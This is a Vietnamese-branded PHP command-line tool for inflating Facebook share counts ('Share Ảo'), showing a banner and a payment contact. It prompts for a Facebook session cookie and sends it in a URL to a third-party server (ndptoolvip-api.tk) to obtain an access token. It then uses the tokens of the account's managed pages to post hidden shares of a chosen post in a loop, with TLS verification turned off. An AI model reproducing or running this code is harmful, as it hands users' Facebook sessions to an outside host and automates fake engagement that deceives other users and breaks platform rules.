<?php

@system('clear');
$nen_do ="\033[41m" ;
$nen_luc ="\033[42m" ;
$nen_vang ="\033[43m" ;
$nen_bien ="\033[46m" ;
$nen_trang ="\033[47m" ;
////
$nen_4 ="\033[45m" ;
$duoi = "\033[0m";
date_default_timezone_set("Asia/Ho_Chi_Minh");
$BBlack="\033[1;30m" ; 
$BRed="\033[1;31m" ;
$BGreen="\033[1;32m" ;
$BYellow="\033[1;33m" ;
$BBlue="\033[1;34m" ;
$BPurple="\033[1;35m" ;
$BCyan="\033[1;36m" ;
$BWhite="\033[1;37m" ;
$Blue="\033[0;34m";
$lime="\033[1;32m";
$red="\033[1;31m";
$xanh="\033[1;32m";
$cyan="\033[1;36m";
$yellow="\033[1;33m";
$turquoise="\033[1;34m";
$maugi="\033[1;35m";
$white= "\033[1;37m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;33m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$do="\033[1;91m";
$van = "$do ➜$luc";
$k = "0";
$vt="0";
$khoToken = [];
$logo = "
\033[1;34m██╗   ██╗ █████╗ ███╗   ██╗
\033[1;97m██║   ██║██╔══██╗████╗  ██║
\033[1;34m██║   ██║███████║██╔██╗ ██║
\033[1;97m╚██╗ ██╔╝██╔══██║██║╚██╗██║
\033[1;34m ╚████╔╝ ██║  ██║██║ ╚████║
\033[1;97m  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝
\n";

echo $logo;
$vanv = "".$do."》".$xanh."》".$vang."》".$luc;
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
echo "$van \033[1;97mBản Quyền : \033[1;93mVăn Boss \n";
echo "$van \033[1;97mMomo: \033[1;32m0326682281 \n";
echo "$van \033[1;97mTSR: vanx2k6veo \n";
echo "$van \033[1;97mTool : Share Ảo    \n";
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";

$useragent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36';

echo $van." Nhập ID Bài viết : ";
$id = trim(fgets(STDIN));
echo $van." Chạy Bao Nhiêu Share Thì Dừng : ";
$dung= trim(fgets(STDIN));
while(true){
echo $van." Nhập Cookie Facebook : ";
$ck = trim(fgets(STDIN));
$tk = laytoken($ck, $useragent);



if ( $tk == "die" ){
	echo $van." Cookie Die Rồi \n";
	continue;
}else{
	echo $van." Get Thông Tin Thành Công\n";
	$access_token = $tk["access_token"];
	$name  = $tk['name'];
    $uid   = $tk['id'];
	break;
}
}
@system('clear');
echo $logo;
$vanv = "".$do."》".$xanh."》".$vang."》".$luc;
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
echo "$van \033[1;97mBản Quyền : \033[1;93mVăn Boss \n";
echo "$van \033[1;97mMomo: \033[1;32m0326682281 \n";
echo "$van \033[1;97mTSR: vanx2k6veo \n";
echo "$van \033[1;97mTool : Share Ảo    \n";
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
echo $van." FACEBOOK : ".$trang.$name.$do." | ".$luc." ID : ".$trang.$uid." \n";
echo $van." ID BÀI VIẾT : ".$trang.$id." \n";
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
$kho = get_tk_page($access_token);
$sopage = count($kho["data"]);
echo $van." TÌM THẤY : ".$trang.$sopage." PAGE \n";
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
for ($so = 0; $so < $sopage; $so++) {
	$tokenpage = $kho["data"][$so]["access_token"];
	$uid = $kho["data"][$so]["category"];
	$gop = $tokenpage.'|'.$uid.'|';
	array_push($khoToken, $gop);
}

while(true){
	foreach ($khoToken as $tttt) {
		$giainen = explode('|', $tttt);
		$tk = $giainen[0];
		$id_page = $giainen[1];
$share = share($tk,$id,$ck);
$id_s = $share["id"] ;
if ( !$id_s ){
	echo $van." SHARE THẤT BẠI ".$trang.$id_page." \n";
}else{
$gio = date("H:i");
$tt = $tt+1;
echo "".$do." | ".$BBlue.$tt.$do." | ".$luc.$gio.$do." | ".$trang."SHARE".$do." | ".$vang.$id_s.$do." | ".$luc.$id_page."\n";
if ( $tt == $dung ){
	echo $van." Đã Chạy Hoàn Thành $tt Share \n";
	exit;
}
}
}
}

function laytoken($cookie, $useragent) {
    $url = "https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie=".$cookie;
    $tc = file_get_contents($url);
    $js = json_decode($tc,true);
if($js["status"] == "success"){
	return $js;
} else {
	return 'die';
}
}

function get_tk_page($tk){
	$url = "https://graph.facebook.com/me/accounts?access_token=".$tk;
	$tc = file_get_contents($url);
    $js = json_decode($tc,true);

		return $js;
	}

function share($tk,$id) {
 $url = "https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/".$id."&published=0&access_token=".$tk;
 
 
$mr = curl_init();
curl_setopt_array($mr, array(
  CURLOPT_PORT => "443",
  CURLOPT_URL => "$url",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_SSL_VERIFYPEER => false,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_CUSTOMREQUEST => "POST",));
$mr2 = curl_exec($mr); curl_close($mr);
$js = json_decode($mr2,true);
   return $js;
}